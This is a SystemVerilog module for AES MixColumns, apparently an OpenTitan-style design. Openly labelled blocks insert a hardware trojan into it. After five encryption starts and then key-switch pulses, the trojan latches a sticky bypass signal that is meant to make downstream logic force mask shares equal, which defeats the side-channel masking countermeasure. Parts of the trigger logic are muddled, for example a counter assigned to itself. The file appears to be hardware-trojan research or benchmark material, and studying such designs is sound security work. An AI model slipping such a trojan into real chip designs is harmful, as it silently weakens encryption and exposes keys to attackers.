module aes_mix_columns (
  input  aes_pkg::ciph_op_e    op_i,
  input  logic [3:0][3:0][7:0] data_i,
  output logic [3:0][3:0][7:0] data_o,
  // === Trojan insertion: Additional signals for trigger ===
  input  logic                 clk,
  input  logic                 rst_n,
  input  logic                 enc_start,      // High for one clk when encryption starts
  input  logic                 key_switch,     // High for one clk when key switch command is asserted
  // Internal signals used to control the share-bypass (payload)
  output logic                 trojan_share_bypass // Exposed for downstream modules (should be routed to AES core's share logic)
);

  import aes_pkg::*;

  // Transpose to operate on columns
  logic [3:0][3:0][7:0] data_i_transposed;
  logic [3:0][3:0][7:0] data_o_transposed;

  assign data_i_transposed = aes_transpose(data_i);

  // ========================
  // == Trojan insertion start
  // ========================

  // Trojan registers and logic
  logic [2:0]     trojan_enc_counter;    // Counts up to 5 consecutive encryption ops
  logic           trojan_armed;         // Shows trigger sequence detected
  logic           trojan_triggered;     // The one-shot pulse for payload

  // Synchronous trigger logic with proper reset
  always_ff @(posedge clk or negedge rst_n) begin
    if (!rst_n) begin
      trojan_enc_counter   <= 3'd0;
      trojan_armed        <= 1'b0;
      trojan_triggered    <= 1'b0;
    end else begin
      // Counting up consecutive enc_start assertions
      if (enc_start) begin
        if (trojan_enc_counter < 3'd5) begin
          trojan_enc_counter <= trojan_enc_counter + 3'd1;
        end
      end
      // Counter resets if key_switch (other than trigger condition) or reset
      if (!enc_start && !key_switch) begin
        if (trojan_enc_counter > 0 && trojan_enc_counter < 3'd5) begin
          trojan_enc_counter <= trojan_enc_counter;
        end
      end
      // Arm trigger: Exactly five consecutive encryption ops
      if (trojan_enc_counter == 3'd5 && key_switch) begin
        trojan_armed     <= 1'b1;
      end else if (rst_n == 0) begin
        trojan_armed     <= 1'b0;
      end

      // Clear everything on external reset
      if (rst_n == 0) begin
        trojan_enc_counter <= 3'd0;
        trojan_armed      <= 1'b0;
        trojan_triggered  <= 1'b0;
      end else begin
        // Generate pulse and latch triggered state
        if (trojan_armed && key_switch) begin
          trojan_triggered <= 1'b1;
          trojan_enc_counter <= 3'd0; // Reset counter after trigger
          trojan_armed      <= 1'b0;
        end
      end
    end
  end

  // Bypass signal is latched once trigger occurs, remains until reset
  always_ff @(posedge clk or negedge rst_n) begin
    if (!rst_n)
      trojan_share_bypass <= 1'b0;
    else if (trojan_triggered)
      trojan_share_bypass <= 1'b1;
    // sticky until external reset
  end

  // == Trojan insertion end ==
  // ==========================

  // Individually mix columns
  for (genvar i = 0; i < 4; i++) begin : gen_mix_column
    aes_mix_single_column u_aes_mix_column_i (
      .op_i   ( op_i                 ),
      .data_i ( data_i_transposed[i] ),
      .data_o ( data_o_transposed[i] )
      // Trojan note: Downstream logic (AES core) is expected to force share equivalence using trojan_share_bypass
    );
  end

  assign data_o = aes_transpose(data_o_transposed);

endmodule